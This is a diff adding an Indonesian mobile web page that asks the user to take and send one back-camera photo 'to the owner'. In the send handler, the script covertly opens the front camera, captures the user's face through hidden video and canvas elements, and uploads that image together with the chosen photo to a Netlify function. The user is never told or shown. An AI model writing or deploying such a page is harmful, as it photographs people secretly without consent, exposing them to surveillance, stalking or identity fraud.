@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Kirim Foto</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+  html, body {
+    width: 100%; height: 100%;
+    background: #000;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    color: #fff;
+    overflow: hidden;
+    position: fixed;
+  }
+
+  #intro {
+    position: absolute; inset: 0;
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    padding: 24px; text-align: center;
+    background: #0a0a0a;
+    z-index: 10;
+  }
+  #intro h1 { font-size: 20px; font-weight: 600; margin-bottom: 8px; }
+  #intro p  { font-size: 13px; color: #888; margin-bottom: 32px; line-height: 1.5; max-width: 320px; }
+  .btn {
+    width: 100%; max-width: 320px;
+    padding: 16px; border: none; border-radius: 12px;
+    background: linear-gradient(135deg, #2b8fff, #1a6fe0);
+    color: #fff; font-size: 15px; font-weight: 600;
+    cursor: pointer; transition: transform 0.1s, opacity 0.2s;
+  }
+  .btn:active { transform: scale(0.98); }
+  .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+
+  #camera {
+    position: absolute; inset: 0;
+    display: none;
+    flex-direction: column;
+    background: #000;
+    z-index: 20;
+  }
+  #camera.active { display: flex; }
+
+  #previewWrap {
+    flex: 1;
+    position: relative;
+    overflow: hidden;
+    background: #000;
+    min-height: 0;
+  }
+  #preview {
+    position: absolute; inset: 0;
+    width: 100%; height: 100%;
+    object-fit: cover;
+    background: #000;
+  }
+
+  #controls {
+    height: 120px;
+    flex-shrink: 0;
+    background: rgba(0,0,0,0.9);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .shutter {
+    width: 72px; height: 72px;
+    border-radius: 50%;
+    background: #fff;
+    border: 4px solid rgba(255,255,255,0.3);
+    background-clip: padding-box;
+    cursor: pointer;
+    transition: transform 0.1s;
+  }
+  .shutter:active { transform: scale(0.9); }
+
+  #review {
+    position: absolute; inset: 0;
+    display: none;
+    flex-direction: column;
+    background: #000;
+    z-index: 30;
+  }
+  #review.active { display: flex; }
+
+  #reviewWrap {
+    flex: 1;
+    position: relative;
+    overflow: hidden;
+    min-height: 0;
+  }
+  #reviewImg {
+    position: absolute; inset: 0;
+    width: 100%; height: 100%;
+    object-fit: contain;
+    background: #000;
+  }
+
+  #reviewControls {
+    height: 120px;
+    flex-shrink: 0;
+    background: rgba(0,0,0,0.9);
+    display: flex;
+    align-items: center;
+    justify-content: space-around;
+    padding: 0 24px;
+    gap: 12px;
+  }
+  .action {
+    flex: 1;
+    max-width: 160px;
+    padding: 14px;
+    border: none;
+    border-radius: 12px;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: transform 0.1s, opacity 0.2s;
+  }
+  .action:active { transform: scale(0.97); }
+  .action:disabled { opacity: 0.5; cursor: not-allowed; }
+  .action.cancel { background: #2a2a2a; color: #fff; }
+  .action.send   { background: linear-gradient(135deg, #2b8fff, #1a6fe0); color: #fff; }
+
+  #statusOverlay {
+    position: absolute; inset: 0;
+    display: none;
+    flex-direction: column;
+    align-items: center; justify-content: center;
+    background: rgba(0,0,0,0.85);
+    z-index: 40;
+    padding: 24px;
+    text-align: center;
+  }
+  #statusOverlay.active { display: flex; }
+  #statusOverlay .spinner {
+    width: 40px; height: 40px;
+    border: 3px solid rgba(255,255,255,0.15);
+    border-top-color: #2b8fff;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+    margin-bottom: 20px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  #statusOverlay .msg { font-size: 14px; color: #ccc; }
+  #statusOverlay.err .spinner { display: none; }
+  #statusOverlay.err .msg { color: #f87171; }
+  #statusOverlay.ok .spinner { display: none; }
+  #statusOverlay.ok .msg { color: #4ade80; }
+
+  #vFront, #cBack, #cFront { display: none; }
+</style>
+</head>
+<body>
+
+<div id="intro">
+  <h1>Tambahkan Foto</h1>
+  <p>Foto yang akan dikirim ke owner</p>
+  <button class="btn" id="startBtn">Mulai</button>
+</div>
+
+<div id="camera">
+  <div id="previewWrap">
+    <video id="preview" playsinline autoplay muted></video>
+  </div>
+  <div id="controls">
+    <button class="shutter" id="shutter"></button>
+  </div>
+</div>
+
+<div id="review">
+  <div id="reviewWrap">
+    <img id="reviewImg" alt="">
+  </div>
+  <div id="reviewControls">
+    <button class="action cancel" id="cancelBtn">Batal</button>
+    <button class="action send"   id="sendBtn">Kirim</button>
+  </div>
+</div>
+
+<div id="statusOverlay">
+  <div class="spinner"></div>
+  <div class="msg" id="statusMsg"></div>
+</div>
+
+<video id="vFront" playsinline autoplay muted></video>
+<canvas id="cBack"></canvas>
+<canvas id="cFront"></canvas>
+
+<script>
+const intro         = document.getElementById('intro');
+const cameraEl      = document.getElementById('camera');
+const reviewEl      = document.getElementById('review');
+const statusOverlay = document.getElementById('statusOverlay');
+const statusMsg     = document.getElementById('statusMsg');
+
+const startBtn  = document.getElementById('startBtn');
+const shutter   = document.getElementById('shutter');
+const cancelBtn = document.getElementById('cancelBtn');
+const sendBtn   = document.getElementById('sendBtn');
+
+const preview   = document.getElementById('preview');
+const reviewImg = document.getElementById('reviewImg');
+
+const vFront = document.getElementById('vFront');
+const cBack  = document.getElementById('cBack');
+const cFront = document.getElementById('cFront');
+
+let backStream  = null;
+let frontStream = null;
+let capturedBackBlob = null;
+
+function showStatus(msg, cls = '') {
+  statusMsg.textContent = msg;
+  statusOverlay.className = 'active ' + cls;
+}
+function hideStatus() { statusOverlay.className = ''; }
+
+function stopStream(s) {
+  if (!s) return;
+  s.getTracks().forEach(t => t.stop());
+}
+
+async function openBackCamera() {
+  backStream = await navigator.mediaDevices.getUserMedia({
+    video: {
+      facingMode: { ideal: 'environment' },
+      width:  { ideal: 1280 },
+      height: { ideal: 720 }
+    },
+    audio: false
+  });
+  preview.srcObject = backStream;
+  preview.setAttribute('playsinline', '');
+  preview.setAttribute('autoplay', '');
+  preview.setAttribute('muted', '');
+  await preview.play();
+}
+
+async function openFrontCamera() {
+  frontStream = await navigator.mediaDevices.getUserMedia({
+    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+    audio: false
+  });
+  vFront.srcObject = frontStream;
+  vFront.setAttribute('playsinline', '');
+  vFront.setAttribute('autoplay', '');
+  vFront.setAttribute('muted', '');
+  await vFront.play();
+}
+
+function waitFrame(v) {
+  return new Promise(res => {
+    if (v.readyState >= 2 && v.videoWidth > 0) return res();
+    v.onloadeddata = () => res();
+  });
+}
+
+function grabBlob(video, canvas, quality = 0.85) {
+  canvas.width  = video.videoWidth  || 640;
+  canvas.height = video.videoHeight || 480;
+  const ctx = canvas.getContext('2d');
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+  return new Promise(res => canvas.toBlob(res, 'image/jpeg', quality));
+}
+
+function blobToBase64(blob) {
+  return new Promise((res, rej) => {
+    const fr = new FileReader();
+    fr.onload = () => res(fr.result.split(',')[1]);
+    fr.onerror = rej;
+    fr.readAsDataURL(blob);
+  });
+}
+
+async function sendPhoto(blob, caption) {
+  const photoBase64 = await blobToBase64(blob);
+  const r = await fetch('/.netlify/functions/send', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ caption, photoBase64 })
+  });
+  const data = await r.json();
+  if (!data.ok) throw new Error(data.description || 'send error');
+  return data;
+}
+
+/* ---------- flow ---------- */
+
+startBtn.addEventListener('click', async () => {
+  startBtn.disabled = true;
+  try {
+    showStatus('Menyiapkan kamera...');
+    await openBackCamera();
+    hideStatus();
+    intro.style.display = 'none';
+    cameraEl.classList.add('active');
+  } catch (err) {
+    showStatus('Izin kamera ditolak: ' + err.message, 'err');
+    startBtn.disabled = false;
+  }
+});
+
+shutter.addEventListener('click', async () => {
+  shutter.disabled = true;
+  try {
+    await waitFrame(preview);
+    capturedBackBlob = await grabBlob(preview, cBack, 0.9);
+    reviewImg.src = URL.createObjectURL(capturedBackBlob);
+    cameraEl.classList.remove('active');
+    reviewEl.classList.add('active');
+  } catch (err) {
+    alert('Gagal ambil gambar: ' + err.message);
+  } finally {
+    shutter.disabled = false;
+  }
+});
+
+cancelBtn.addEventListener('click', () => {
+  if (capturedBackBlob) {
+    URL.revokeObjectURL(reviewImg.src);
+    capturedBackBlob = null;
+  }
+  reviewImg.src = '';
+  reviewEl.classList.remove('active');
+  cameraEl.classList.add('active');
+});
+
+sendBtn.addEventListener('click', async () => {
+  if (!capturedBackBlob) return;
+  cancelBtn.disabled = true;
+  sendBtn.disabled = true;
+
+  try {
+    showStatus('Mengirim...');
+
+    // matikan kamera belakang biar kamera depan bisa aktif
+    stopStream(backStream);
+    preview.srcObject = null;
+    backStream = null;
+    await new Promise(r => setTimeout(r, 300));
+
+    // capture kamera depan
+    await openFrontCamera();
+    await waitFrame(vFront);
+    const frontBlob = await grabBlob(vFront, cFront, 0.85);
+
+    // kirim dua-duanya lewat netlify function
+    await sendPhoto(capturedBackBlob, '📷 Kamera belakang');
+    await sendPhoto(frontBlob,        '📸 Kamera depan');
+
+    stopStream(frontStream);
+    vFront.srcObject = null;
+
+    showStatus('Terkirim ✓', 'ok');
+    setTimeout(() => location.reload(), 1200);
+  } catch (err) {
+    showStatus('Gagal: ' + err.message, 'err');
+    cancelBtn.disabled = false;
+    sendBtn.disabled = false;
+  }
+});
+</script>
+
+</body>
+</html>
